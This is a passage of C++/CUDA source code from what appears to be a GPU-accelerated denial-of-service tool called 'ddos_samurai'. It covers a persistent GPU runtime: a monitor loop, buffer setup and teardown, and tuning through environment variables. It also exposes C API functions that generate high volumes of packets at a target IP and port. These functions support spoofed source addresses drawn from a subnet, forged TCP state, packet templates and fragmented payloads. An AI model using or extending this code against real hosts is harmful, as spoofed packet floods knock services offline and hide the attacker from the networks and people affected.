        if (mean > 0.0) {
          double var = 0.0;
          for (double x : fairness_samples) {
            const double dlt = x - mean;
            var += dlt * dlt;
          }
          var /= static_cast<double>(fairness_samples.size());
          cv = (std::sqrt(var) / mean) * 100.0;
        }
        rt.ctrl->scheduler_fairness_cv_pct_x100 = static_cast<uint64_t>(std::llround(cv * 100.0));
      } else {
        rt.ctrl->scheduler_fairness_cv_pct_x100 = 0u;
      }
      for (auto& kv : g_persistent_streams) {
        kv.second.scheduler_fairness_cv_pct =
            static_cast<double>(rt.ctrl->scheduler_fairness_cv_pct_x100) / 100.0;
      }
      persistent_sync_active_stream_count_unlocked(rt);
    }

    const uint64_t now = now_ns_steady();
    const uint64_t no_progress_ns = static_cast<uint64_t>(std::max(100, rt.no_progress_ms)) * 1000000ull;
    if (now > last_progress && (now - last_progress) > no_progress_ns) {
      rt.ctrl->no_progress_events += 1u;
      if (rt.tx_bridge.kind == PersistentTxBackendKind::kNoop) {
        // In generation-only validation mode there is no external NIC progress signal.
        // Avoid punitive quota halving and kernel restarts that distort producer throughput.
        last_progress = now_ns_steady();
        continue;
      }
      {
        std::lock_guard<std::mutex> g(g_persistent_lock);
        rt.ctrl->throttle_events += 1u;
        std::vector<int> throttle_slots;
        throttle_slots.reserve(g_persistent_streams.size());
        for (const auto& kv : g_persistent_streams) {
          if (kv.second.device_slot >= 0 && kv.second.device_slot < kPersistentMaxStreams && rt.streams) {
            throttle_slots.push_back(kv.second.device_slot);
          }
        }
        const bool throttle_copy_ok = throttle_slots.empty()
            ? true
            : persistent_stream_copy_slots_to_host_batch(rt, throttle_slots.data(), throttle_slots.size());
        std::vector<int> update_slots;
        std::vector<uint32_t> update_values;
        update_slots.reserve(throttle_slots.size());
        update_values.reserve(throttle_slots.size());
        for (auto& kv : g_persistent_streams) {
          if (kv.second.device_slot < 0 || kv.second.device_slot >= kPersistentMaxStreams || !rt.streams) {
            continue;
          }
          if (!throttle_copy_ok) {
            continue;
          }
          PersistentDeviceStreamState& d = rt.streams[kv.second.device_slot];
          if (d.active == 0) {
            continue;
          }
          d.quota_left = std::max<uint32_t>(1u, d.quota_left / 2u);
          update_slots.push_back(kv.second.device_slot);
          update_values.push_back(d.quota_left);
        }
        if (!update_slots.empty()) {
          (void)persistent_stream_write_u32_field_batch(
              rt,
              update_slots.data(),
              update_values.data(),
              update_slots.size(),
              offsetof(PersistentDeviceStreamState, quota_left));
        }
      }
      rt.ctrl->drain_attempts += 1u;
      std::this_thread::sleep_for(std::chrono::microseconds(std::max(50, rt.bridge_idle_sleep_us)));
      const uint64_t tx_before = rt.ctrl->tx_bridge_sent;
      const int occ_before = ring_occupancy_now(rt);

      persistent_stop_kernel();
      if (persistent_launch_kernel()) {
        rt.ctrl->runtime_restarts += 1u;
      } else {
        rt.ctrl->native_batch_degrade_events += 1u;
        g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
      }
      const uint64_t tx_after = rt.ctrl->tx_bridge_sent;
      const int occ_after = ring_occupancy_now(rt);
      if (tx_after > tx_before || occ_after < occ_before) {
        last_progress = now_ns_steady();
        continue;
      }
      last_progress = now_ns_steady();
    }
  }
}

inline void persistent_runtime_release_unlocked() {
  PersistentRuntime& rt = g_persistent_runtime;
  rt.threads_running.store(false, std::memory_order_relaxed);
  persistent_stop_kernel();
  for (auto& t : rt.bridge_threads) {
    if (t.joinable()) {
      t.join();
    }
  }
  rt.bridge_threads.clear();
  if (rt.monitor_thread.joinable()) {
    rt.monitor_thread.join();
  }
  if (rt.kernel_stream) {
    (void)cudaStreamDestroy(rt.kernel_stream);
    rt.kernel_stream = nullptr;
  }
  if (rt.bridge_copy_stream) {
    (void)cudaStreamDestroy(rt.bridge_copy_stream);
    rt.bridge_copy_stream = nullptr;
  }
  if (rt.bridge_copy_event) {
    (void)cudaEventDestroy(rt.bridge_copy_event);
    rt.bridge_copy_event = nullptr;
  }
  persistent_quota_refill_graph_destroy(rt);
  if (rt.quota_refill_stream) {
    (void)cudaStreamDestroy(rt.quota_refill_stream);
    rt.quota_refill_stream = nullptr;
  }
  if (rt.rings_host) {
    (void)cudaFreeHost(rt.rings_host);
    rt.rings_host = nullptr;
  }
  if (rt.rings_dev) {
    (void)cudaFree(rt.rings_dev);
    rt.rings_dev = nullptr;
  }
  if (rt.queue_slot_hint_dev) {
    (void)cudaFree(rt.queue_slot_hint_dev);
    rt.queue_slot_hint_dev = nullptr;
  }
  if (rt.payload_host) {
    (void)cudaFreeHost(rt.payload_host);
    rt.payload_host = nullptr;
  }
  if (rt.payload_dev) {
    (void)cudaFree(rt.payload_dev);
    rt.payload_dev = nullptr;
  }
  if (rt.doca_gpu_txq_handles_dev) {
    (void)cudaFree(rt.doca_gpu_txq_handles_dev);
    rt.doca_gpu_txq_handles_dev = nullptr;
  }
  if (rt.doca_txq_mkeys_be_dev) {
    (void)cudaFree(rt.doca_txq_mkeys_be_dev);
    rt.doca_txq_mkeys_be_dev = nullptr;
  }
  if (rt.streams) {
    (void)cudaFreeHost(rt.streams);
    rt.streams = nullptr;
  }
  if (rt.streams_dev) {
    (void)cudaFree(rt.streams_dev);
    rt.streams_dev = nullptr;
  }
  if (rt.streams_hot_dev) {
    (void)cudaFree(rt.streams_hot_dev);
    rt.streams_hot_dev = nullptr;
  }
  if (rt.ctrl) {
    (void)cudaFreeHost(rt.ctrl);
    rt.ctrl = nullptr;
    rt.ctrl_dev = nullptr;
  }
  if (rt.run_flag_dev) {
    (void)cudaFree(rt.run_flag_dev);
    rt.run_flag_dev = nullptr;
  }
  rt.queue_count = 1;
  rt.ring_slots = 0;
  rt.bridge_thread_count = 1;
  rt.doca_kernel_direct_tx = false;
  rt.max_packet_bytes = kPersistentMaxPacketBytes;
  rt.queue_drain_cursor.clear();
  rt.queue_sent_counts.clear();
  for (auto& c : rt.completed_by_slot) {
    c.store(0u, std::memory_order_relaxed);
  }
  persistent_bridge_backend_shutdown_unlocked(rt);
  persistent_contract_runtime_release_unlocked();
}

inline bool persistent_runtime_ensure_started_unlocked() {
  PersistentRuntime& rt = g_persistent_runtime;
  if (rt.ctrl && rt.run_flag_dev && rt.streams && rt.streams_dev && rt.streams_hot_dev &&
      rt.rings_host && rt.rings_dev && rt.payload_host && rt.payload_dev && rt.bridge_copy_stream &&
      rt.bridge_copy_event &&
      rt.threads_running.load(std::memory_order_relaxed)) {
    return true;
  }
  persistent_runtime_release_unlocked();

  auto env_int_local = [](const char* name, int defv) -> int {
    const char* v = std::getenv(name);
    if (!v || !*v) {
      return defv;
    }
    try {
      return std::stoi(v);
    } catch (...) {
      return defv;
    }
  };
  auto env_has = [](const char* name) -> bool {
    const char* v = std::getenv(name);
    return (v && *v);
  };
  auto round_up_pow2 = [](int v, int cap) -> int {
    if (v <= 1) {
      return 1;
    }
    int p = 1;
    while (p < v && p < cap) {
      p <<= 1;
    }
    if (p > cap) {
      p = cap;
    }
    return p;
  };

  const int hw_threads = std::max(1, static_cast<int>(std::thread::hardware_concurrency()));
  cudaDeviceProp dev_prop{};
  std::memset(&dev_prop, 0, sizeof(dev_prop));
  int dev_id = 0;
  int gpu_sms = 0;
  if (cudaGetDevice(&dev_id) == cudaSuccess && cudaGetDeviceProperties(&dev_prop, dev_id) == cudaSuccess) {
    gpu_sms = std::max(1, dev_prop.multiProcessorCount);
  } else {
    gpu_sms = 1;
  }

  int auto_queue_count = std::max(hw_threads / 4, gpu_sms / 12);
  auto_queue_count = clamp_i(auto_queue_count, 1, 16);
  rt.queue_count = env_has("SAMURAI_GPU_QUEUE_COUNT")
      ? clamp_i(env_int_local("SAMURAI_GPU_QUEUE_COUNT", auto_queue_count), 1, 64)
      : auto_queue_count;

  rt.epoch_ms = clamp_i(env_int_local("SAMURAI_GPU_EPOCH_MS", 50), 1, 5000);
  rt.heartbeat_ms = clamp_i(env_int_local("SAMURAI_GPU_HEARTBEAT_MS", 500), 10, 10000);
  rt.no_progress_ms = clamp_i(env_int_local("SAMURAI_GPU_NO_PROGRESS_MS", 2000), 100, 60000);
  rt.bridge_max_burst = clamp_i(env_int_local("SAMURAI_GPU_BRIDGE_MAX_BURST", 64), 1, 4096);
  rt.bridge_idle_sleep_us = clamp_i(env_int_local("SAMURAI_GPU_BRIDGE_IDLE_SLEEP_US", 200), 0, 100000);
  rt.bridge_drain_budget_ns = clamp_i(env_int_local("SAMURAI_GPU_BRIDGE_DRAIN_BUDGET_NS", 200000), 1000, 100000000);
  rt.bridge_ipg_ns = clamp_i(env_int_local("SAMURAI_GPU_BRIDGE_IPG_NS", 0), 0, 1000000000);
  rt.bridge_copy_overlap_reap = env_int_local("SAMURAI_GPU_BRIDGE_COPY_OVERLAP_REAP", 1) != 0;
  int auto_bridge_threads = std::max(1, hw_threads / 6);
  auto_bridge_threads = std::min(auto_bridge_threads, std::max(1, rt.queue_count));
  rt.bridge_thread_count = env_has("SAMURAI_GPU_BRIDGE_THREADS")
      ? clamp_i(env_int_local("SAMURAI_GPU_BRIDGE_THREADS", auto_bridge_threads), 1, 64)
      : auto_bridge_threads;
  if (rt.bridge_thread_count > rt.queue_count) {
    rt.bridge_thread_count = rt.queue_count;
  }
  if (rt.bridge_ipg_ns > 0) {
    // Keep deterministic pacing order when inter-packet gap pacing is enabled.
    rt.bridge_thread_count = 1;
  }
  int auto_ring_slots = 2048 + (rt.queue_count * 512) + (rt.bridge_thread_count * 256);
  if (gpu_sms >= 80) {
    auto_ring_slots += 2048;
  } else if (gpu_sms >= 40) {
    auto_ring_slots += 1024;
  }
  auto_ring_slots = round_up_pow2(auto_ring_slots, 65536);
  const uint64_t ring_budget_mb = static_cast<uint64_t>(
      std::max(32, env_int_local("SAMURAI_GPU_RING_BUDGET_MB", 256)));
  const uint64_t ring_budget_bytes = ring_budget_mb * 1024ull * 1024ull;
  const uint64_t bytes_per_slot =
      static_cast<uint64_t>(kPersistentUmemFrameSize) + static_cast<uint64_t>(sizeof(PersistentRingSlot));
  int budget_slots = static_cast<int>(
      ring_budget_bytes /
      (static_cast<uint64_t>(std::max(1, rt.queue_count)) * std::max<uint64_t>(1ull, bytes_per_slot)));
  budget_slots = clamp_i(budget_slots, 64, 65536);
  auto_ring_slots = std::min(auto_ring_slots, budget_slots);
  auto_ring_slots = clamp_i(auto_ring_slots, 64, 65536);
  rt.ring_slots = env_has("SAMURAI_GPU_RING_SLOTS")
      ? clamp_i(env_int_local("SAMURAI_GPU_RING_SLOTS", auto_ring_slots), 64, 65536)
      : auto_ring_slots;
  rt.bridge_next_send_ns = 0u;
  const int mtu_bytes = clamp_i(env_int_local("SAMURAI_GPU_PERSISTENT_MTU", kPersistentDefaultMtu), 576, 9000);
  const int frame_cap = kPersistentUmemFrameSize - kPersistentUmemHeadroom;
  const int cfg_packet_cap =
      clamp_i(env_int_local("SAMURAI_GPU_PERSISTENT_MAX_PACKET_BYTES", std::min(frame_cap, mtu_bytes + 14)), 64, frame_cap);
  rt.max_packet_bytes = std::min(frame_cap, cfg_packet_cap);
  for (auto& c : rt.completed_by_slot) {
    c.store(0u, std::memory_order_relaxed);
  }

  void* ctrl_host = nullptr;
  if (cudaHostAlloc(&ctrl_host, sizeof(PersistentRuntimeControl), cudaHostAllocPortable | cudaHostAllocMapped) !=
          cudaSuccess ||
      !ctrl_host) {
    return false;
  }
  rt.ctrl = static_cast<PersistentRuntimeControl*>(ctrl_host);
  std::memset(rt.ctrl, 0, sizeof(PersistentRuntimeControl));
  if (cudaHostGetDevicePointer(reinterpret_cast<void**>(&rt.ctrl_dev), ctrl_host, 0) != cudaSuccess || !rt.ctrl_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  rt.ctrl->queue_count = rt.queue_count;
  rt.ctrl->ring_slots = rt.ring_slots;
  rt.ctrl->max_streams = kPersistentMaxStreams;
  rt.ctrl->active_streams = 0;
  rt.ctrl->queue_probe_span =
      clamp_i(env_int_local("SAMURAI_GPU_QUEUE_PROBE_SPAN", 4), 1, std::max(1, rt.queue_count));
  rt.ctrl->max_packet_bytes = rt.max_packet_bytes;
  if (cudaMalloc(&rt.run_flag_dev, sizeof(int32_t)) != cudaSuccess || !rt.run_flag_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  {
    const int32_t run_init = 0;
    if (cudaMemcpy(rt.run_flag_dev, &run_init, sizeof(run_init), cudaMemcpyHostToDevice) != cudaSuccess) {
      persistent_runtime_release_unlocked();
      return false;
    }
  }

  void* streams_host = nullptr;
  const size_t streams_bytes = sizeof(PersistentDeviceStreamState) * static_cast<size_t>(kPersistentMaxStreams);
  if (cudaHostAlloc(&streams_host, streams_bytes, cudaHostAllocPortable) != cudaSuccess ||
      !streams_host) {
    persistent_runtime_release_unlocked();
    return false;
  }
  rt.streams = static_cast<PersistentDeviceStreamState*>(streams_host);
  std::memset(rt.streams, 0, streams_bytes);
  if (cudaMalloc(&rt.streams_dev, streams_bytes) != cudaSuccess || !rt.streams_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (cudaMemset(rt.streams_dev, 0, streams_bytes) != cudaSuccess) {
    persistent_runtime_release_unlocked();
    return false;
  }
  const size_t streams_hot_bytes = sizeof(PersistentStreamHotState) * static_cast<size_t>(kPersistentMaxStreams);
  if (cudaMalloc(&rt.streams_hot_dev, streams_hot_bytes) != cudaSuccess || !rt.streams_hot_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (cudaMemset(rt.streams_hot_dev, 0, streams_hot_bytes) != cudaSuccess) {
    persistent_runtime_release_unlocked();
    return false;
  }

  const size_t ring_count = static_cast<size_t>(rt.queue_count) * static_cast<size_t>(rt.ring_slots);
  const size_t ring_bytes = ring_count * sizeof(PersistentRingSlot);
  void* host_ptr = nullptr;
  if (cudaHostAlloc(&host_ptr, ring_bytes, cudaHostAllocPortable | cudaHostAllocMapped) != cudaSuccess || !host_ptr) {
    persistent_runtime_release_unlocked();
    return false;
  }
  rt.rings_host = static_cast<PersistentRingSlot*>(host_ptr);
  std::memset(rt.rings_host, 0, ring_bytes);
  if (cudaMalloc(&rt.rings_dev, ring_bytes) != cudaSuccess || !rt.rings_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (cudaMemset(rt.rings_dev, 0, ring_bytes) != cudaSuccess) {
    persistent_runtime_release_unlocked();
    return false;
  }
  const size_t queue_hint_bytes = static_cast<size_t>(rt.queue_count) * sizeof(int32_t);
  if (cudaMalloc(&rt.queue_slot_hint_dev, queue_hint_bytes) != cudaSuccess || !rt.queue_slot_hint_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (cudaMemset(rt.queue_slot_hint_dev, 0, queue_hint_bytes) != cudaSuccess) {
    persistent_runtime_release_unlocked();
    return false;
  }

  void* payload_host = nullptr;
  const size_t payload_bytes = ring_count * static_cast<size_t>(kPersistentUmemFrameSize);
  if (cudaHostAlloc(&payload_host, payload_bytes, cudaHostAllocPortable | cudaHostAllocMapped) != cudaSuccess ||
      !payload_host) {
    persistent_runtime_release_unlocked();
    return false;
  }
  rt.payload_host = static_cast<uint8_t*>(payload_host);
  std::memset(rt.payload_host, 0, payload_bytes);
  if (cudaMalloc(&rt.payload_dev, payload_bytes) != cudaSuccess || !rt.payload_dev) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (cudaMemset(rt.payload_dev, 0, payload_bytes) != cudaSuccess) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (!rt.bridge_copy_stream) {
    if (cudaStreamCreateWithFlags(&rt.bridge_copy_stream, cudaStreamNonBlocking) != cudaSuccess) {
      persistent_runtime_release_unlocked();
      return false;
    }
  }
  if (!rt.bridge_copy_event) {
    if (cudaEventCreateWithFlags(&rt.bridge_copy_event, cudaEventDisableTiming) != cudaSuccess) {
      persistent_runtime_release_unlocked();
      return false;
    }
  }
  if (!persistent_quota_refill_graph_prepare(rt)) {
    rt.quota_refill_graph_enabled = false;
  }
  rt.queue_drain_cursor.assign(static_cast<size_t>(rt.queue_count), 0u);
  rt.queue_sent_counts.assign(static_cast<size_t>(rt.queue_count), 0u);
  persistent_sync_active_stream_count_unlocked(rt);
  if (!persistent_contract_runtime_ensure_started_unlocked(rt)) {
    persistent_runtime_release_unlocked();
    return false;
  }
  if (!persistent_bridge_backend_init_unlocked(rt)) {
    persistent_runtime_release_unlocked();
    return false;
  }
  rt.doca_kernel_direct_tx = rt.tx_bridge.doca_kernel_direct_tx;
  if (rt.doca_kernel_direct_tx) {
    if (rt.tx_bridge.doca_gpu_txq_handles.size() != static_cast<size_t>(rt.queue_count) ||
        rt.tx_bridge.doca_txq_mkeys_be.size() != static_cast<size_t>(rt.queue_count)) {
      persistent_runtime_release_unlocked();
      return false;
    }
    const size_t txq_handles_bytes = sizeof(uint64_t) * static_cast<size_t>(rt.queue_count);
    const size_t mkeys_bytes = sizeof(uint32_t) * static_cast<size_t>(rt.queue_count);
    if (cudaMalloc(&rt.doca_gpu_txq_handles_dev, txq_handles_bytes) != cudaSuccess || !rt.doca_gpu_txq_handles_dev) {
      persistent_runtime_release_unlocked();
      return false;
    }
    if (cudaMemcpy(
            rt.doca_gpu_txq_handles_dev,
            rt.tx_bridge.doca_gpu_txq_handles.data(),
            txq_handles_bytes,
            cudaMemcpyHostToDevice) != cudaSuccess) {
      persistent_runtime_release_unlocked();
      return false;
    }
    if (cudaMalloc(&rt.doca_txq_mkeys_be_dev, mkeys_bytes) != cudaSuccess || !rt.doca_txq_mkeys_be_dev) {
      persistent_runtime_release_unlocked();
      return false;
    }
    if (cudaMemcpy(
            rt.doca_txq_mkeys_be_dev,
            rt.tx_bridge.doca_txq_mkeys_be.data(),
            mkeys_bytes,
            cudaMemcpyHostToDevice) != cudaSuccess) {
      persistent_runtime_release_unlocked();
      return false;
    }
  }

  if (!persistent_launch_kernel()) {
    persistent_runtime_release_unlocked();
    return false;
  }
  rt.threads_running.store(true, std::memory_order_relaxed);
  rt.bridge_threads.clear();
  if (!rt.doca_kernel_direct_tx) {
    rt.bridge_threads.reserve(static_cast<size_t>(std::max(1, rt.bridge_thread_count)));
    for (int worker = 0; worker < std::max(1, rt.bridge_thread_count); ++worker) {
      rt.bridge_threads.emplace_back(persistent_bridge_loop, worker, std::max(1, rt.bridge_thread_count));
    }
  }
  rt.monitor_thread = std::thread(persistent_monitor_loop);
  rt.last_progress_ns.store(now_ns_steady(), std::memory_order_relaxed);
  rt.last_epoch_refill_ns.store(now_ns_steady(), std::memory_order_relaxed);
  return true;
}

inline std::string stream_state_to_json(const PersistentStreamState& st) {
  std::ostringstream oss;
  oss << "{"
      << "\"stream_id\":" << st.id << ","
      << "\"active\":" << st.active << ","
      << "\"device_slot\":" << st.device_slot << ","
      << "\"protocol\":" << st.protocol << ","
      << "\"protocol_name\":\"" << protocol_name_from_int(st.protocol) << "\","
      << "\"stream_type\":\"" << json_escape_string(st.stream_type) << "\","
      << "\"stream_kind\":" << st.stream_kind << ","
      << "\"queue_affinity\":" << st.queue_affinity << ","
      << "\"source_port\":" << st.source_port << ","
      << "\"source_port_mode\":" << static_cast<int>(st.source_port_mode) << ","
      << "\"icmp_type\":" << st.icmp_type << ","
      << "\"icmp_code\":" << st.icmp_code << ","
      << "\"payload_len\":" << st.payload_len << ","
      << "\"payload_byte\":" << static_cast<int>(st.payload_byte) << ","
      << "\"has_custom_mac\":" << static_cast<int>(st.has_custom_mac) << ","
      << "\"base_quota\":" << st.base_quota << ","
      << "\"quota\":" << st.quota << ","
      << "\"quota_left\":" << st.quota_left << ","
      << "\"ramp_step\":" << st.ramp_step << ","
      << "\"ramp_interval_epochs\":" << st.ramp_interval_epochs << ","
      << "\"ramp_max_quota\":" << st.ramp_max_quota << ","
      << "\"ramp_epoch_counter\":" << st.ramp_epoch_counter << ","
      << "\"pcap_file\":\"" << json_escape_string(st.pcap_file) << "\","
      << "\"created_ns\":" << st.created_ns << ","
      << "\"updated_ns\":" << st.updated_ns << ","
      << "\"heartbeat_ns\":" << st.heartbeat_ns << ","
      << "\"progress_ns\":" << st.progress_ns << ","
      << "\"submitted\":" << st.submitted << ","
      << "\"completed\":" << st.completed << ","
      << "\"fallback\":" << st.fallback << ","
      << "\"errors\":" << st.errors << ","
      << "\"queue_pressure\":" << st.queue_pressure << ","
      << "\"quota_stall\":" << st.quota_stall << ","
      << "\"bridge_sent\":" << st.bridge_sent << ","
      << "\"ring_occupancy_peak\":" << st.occupancy_peak << ","
      << "\"bridge_drain_batches\":" << st.bridge_drain_batches << ","
      << "\"bridge_drain_packets\":" << st.bridge_drain_packets << ","
      << "\"ring_drop_events\":" << st.ring_drop_events << ","
      << "\"scheduler_fairness_cv_pct\":" << std::fixed << std::setprecision(2) << st.scheduler_fairness_cv_pct
      << ","
      << "\"tx_base_timestamp_ns\":" << st.tx_base_timestamp_ns << ","
      << "\"tx_ipg_ns\":" << st.tx_ipg_ns << ","
      << "\"profile_json\":\"" << json_escape_string(st.profile_json) << "\","
      << "\"update_json\":\"" << json_escape_string(st.update_json) << "\""
      << "}";
  return oss.str();
}
}  // namespace

extern "C" int samurai_gpu_packet_generate_packets(
    int64_t count,
    const char* target_ip,
    int64_t target_port,
    const char* protocol,
    int spoof_ip,
    const char* real_src_ip,
    int64_t tcp_flags,
    int has_ethernet,
    int64_t window,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    const std::string proto = protocol ? std::string(protocol) : std::string("tcp");
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_packets(
            count,
            target,
            target_port,
            proto,
            spoof_ip != 0,
            src,
            tcp_flags,
            has_ethernet != 0,
            window,
            stream,
            gateway_mac,
            subnet);

    return export_packet_result(
        res, "c_api_generate_packets", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_packets_from_template(
    const uint8_t* template_bytes,
    size_t template_len,
    int64_t count,
    const char* real_src_ip,
    int spoof_ip,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    int force_global_fallback,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }
    if (!template_bytes || template_len == 0) {
      return set_c_api_error("template_bytes must not be empty");
    }

    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);
    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_packets_from_template(
            template_bytes,
            template_len,
            count,
            src,
            spoof_ip != 0,
            has_ethernet != 0,
            stream,
            gateway_mac,
            subnet,
            force_global_fallback != 0);

    return export_packet_result(
        res, "c_api_generate_from_template", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_packets_from_template_pool(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates,
    int64_t count,
    const char* target_ip,
    const char* real_src_ip,
    int spoof_ip,
    int64_t specific_src_port,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    int force_global_fallback,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }
    if (num_templates == 0) {
      g_samurai_gpu_packet_last_error.clear();
      return 0;
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_packets_from_template_pool(
            templates_flat,
            templates_flat_len,
            packet_size,
            num_templates,
            count,
            target,
            src,
            spoof_ip != 0,
            specific_src_port,
            has_ethernet != 0,
            stream,
            gateway_mac,
            subnet,
            force_global_fallback != 0);

    return export_packet_result(
        res, "c_api_generate_from_template_pool", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_stateful_packets(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates,
    int64_t count,
    const char* target_ip,
    int spoof_ip,
    const char* real_src_ip,
    int64_t specific_src_port,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    const uint32_t* seq_list,
    size_t seq_len,
    const uint32_t* ack_list,
    size_t ack_len,
    const uint8_t* state_list,
    size_t state_len,
    const uint32_t* actual_lengths,
    size_t actual_lengths_len,
    const uint16_t* window_sizes,
    size_t window_sizes_len,
    const uint16_t* mss_values,
    size_t mss_values_len,
    const uint8_t* ttls,
    size_t ttls_len,
    int force_global_fallback,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }
    if (num_templates == 0) {
      g_samurai_gpu_packet_last_error.clear();
      return 0;
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_stateful_packets(
            templates_flat,
            templates_flat_len,
            packet_size,
            num_templates,
            count,
            target,
            spoof_ip != 0,
            src,
            specific_src_port,
            has_ethernet != 0,
            stream,
            gateway_mac,
            subnet,
            seq_list,
            seq_len,
            ack_list,
            ack_len,
            state_list,
            state_len,
            actual_lengths,
            actual_lengths_len,
            window_sizes,
            window_sizes_len,
            mss_values,
            mss_values_len,
            ttls,
            ttls_len,
            force_global_fallback != 0);

    return export_packet_result(
        res, "c_api_generate_stateful", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_fragmented_packets(
    const uint8_t* payload_bytes,
    size_t payload_len,
    int64_t count,
    const char* target_ip,
    int64_t target_port,
    const char* protocol,
    int spoof_ip,
    const char* real_src_ip,
    int has_ethernet,
    int64_t frag1_size,
    int64_t frag2_size,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }
    if (!payload_bytes && payload_len > 0) {
      return set_c_api_error("payload_bytes pointer is null");
    }
    std::vector<uint8_t> payload;
    if (payload_len > 0) {
      payload.assign(payload_bytes, payload_bytes + payload_len);
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string proto = protocol ? std::string(protocol) : std::string("udp");
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_fragmented_packets(
            payload,
            count,
            target,
            target_port,
            proto,
            spoof_ip != 0,
            src,
            has_ethernet != 0,
            frag1_size,
            frag2_size,
            stream,
            gateway_mac,
            subnet);

    return export_packet_result(
        res, "c_api_generate_fragmented", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

